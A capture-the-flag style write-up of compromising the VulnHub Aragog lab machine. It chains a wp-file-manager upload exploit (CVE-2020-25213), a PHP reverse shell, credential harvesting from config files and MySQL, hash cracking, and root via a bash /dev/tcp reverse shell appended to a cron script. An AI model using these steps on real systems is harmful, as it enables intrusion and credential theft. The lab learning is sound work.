# Penetration Testing Write-Up
## VulnHub HarryPotter: Aragog (1.0.2)
**Alejandro Garcia | February 26, 2026**

---

## Phase 1: Reconnaissance

Ran `ip a` to find the Kali VM's IP address on the host-only network.

`ip a`

Ran an nmap scan of the network to get all the devices on my host-only network.

`nmap -sn 192.168.56.0/24`

Ran a targeted scan to check if this is Aragog's VM IP. Got both port 80 and 22 open which tells me this is the Aragog VM.

`nmap 192.168.56.102`

Then I ran a more in-depth nmap scan to see what services are running, their versions, OS, and common vulns.

`nmap -sV -sC -A -p- 192.168.56.102`

<img width="801" height="459" alt="InDepthNMAPScan" src="https://github.com/user-attachments/assets/00f4e4ef-a03c-4a38-9d64-15fae6cfdd9a" />


Found that port 22 runs SSH and port 80 is a web server we should definitely look at.

---

## Phase 2: Web Enumeration

Visited http://192.168.56.102 and got the Harry Potter picture for their site.

[INSERT SCREENSHOT: browser showing HP image]

I am now going to do a directory brute-force to find any hidden directories using gobuster.

`gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt`

[INSERT SCREENSHOT: gobuster results showing /blog]

Found /blog. When visited, it reveals a WordPress site.

[INSERT SCREENSHOT: browser showing WordPress blog]

---

## Phase 3: WordPress Vulnerability Scanning

Now I will scan the WordPress site using WPScan to find any vulns.

`wpscan --url http://192.168.56.102/blog/ --enumerate ap --plugins-detection aggressive`

[INSERT SCREENSHOT: wpscan results showing wp-file-manager]

Found an out-of-date wp-file-manager plugin that is vulnerable to unauthenticated arbitrary file upload (CVE-2020-25213). I can upload a PHP reverse shell directly to the server.

---

## Phase 4: Exploitation

Cloned the GitHub repository for the exploit.

`git clone https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213`

Need to change the IP and port in the payload file to point back to my Kali machine.

[INSERT SCREENSHOT: payload.php with IP and port set]

Started listener, as the reverse shell will connect back to me.

`nc -lvnp 1234`

Ran the exploit and then triggered the shell.

`bash wp-file-manager-exploit.sh -u http://192.168.56.102/blog -f payload.php`

`curl http://192.168.56.102/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php`

[INSERT SCREENSHOT: reverse shell connection received]

Got a reverse shell as www-data.

---

## Phase 5: Post-Exploitation — Credential Harvesting

Now I need to upgrade the shell to get an interactive bash shell, then look for the database credentials.

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Found WordPress database credentials by locating wp-config.php with find, which led to /usr/share/wordpress/wp-config.php, then followed its reference to the actual credentials in /etc/wordpress/config-default.php (Debian stores WordPress configs separately from the web root).

`find / -name "wp-config.php" 2>/dev/null`

`cat /etc/wordpress/config-default.php`

[INSERT SCREENSHOT: wp-config contents showing DB credentials]

Credentials found:
- User: root
- Password: mySecr3tPass

Got into the database using the password.

`mysql -u root -pmySecr3tPass`

Found hagrid98's password hash in the wp_users table.

[INSERT SCREENSHOT: MySQL query showing password hash]

---

## Phase 6: Hash Cracking & Lateral Movement

Used John the Ripper to crack the hash.

`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

[INSERT SCREENSHOT: john cracking the hash]

Cracked password: password123

Now I will SSH in as hagrid98.

`ssh hagrid98@192.168.56.102`

Got the first Horcrux.

[INSERT SCREENSHOT: first horcrux flag]

---

## Phase 7: Privilege Escalation to Root

I need to gain root access for the second Horcrux.

Downloaded pspy and served it to the target machine to monitor processes.

`python3 -m http.server 8000`

`wget http://192.168.56.101:8000/pspy64 && chmod +x pspy64 && ./pspy64`

[INSERT SCREENSHOT: pspy showing /opt/.backup.sh running as root]

Ran it to see cron jobs running as root. Found that /opt/.backup.sh is executed by root periodically.

Injected a reverse shell into the backup script and opened a listener waiting for the cron job to execute.

`echo 'bash -i >& /dev/tcp/192.168.56.101/5555 0>&1' >> /opt/.backup.sh`

`nc -lvnp 5555`

[INSERT SCREENSHOT: root shell received]

Gained root and found the 2nd Horcrux.

[INSERT SCREENSHOT: second horcrux flag]

---

## Summary

The Aragog VM was compromised through a chain of vulnerabilities starting with an outdated WordPress plugin (wp-file-manager CVE-2020-25213) that allowed unauthenticated file upload. From there, database credentials were extracted, a user password was cracked, and privilege escalation was achieved by injecting a reverse shell into a root-owned cron job script. Both Horcruxes were successfully recovered.
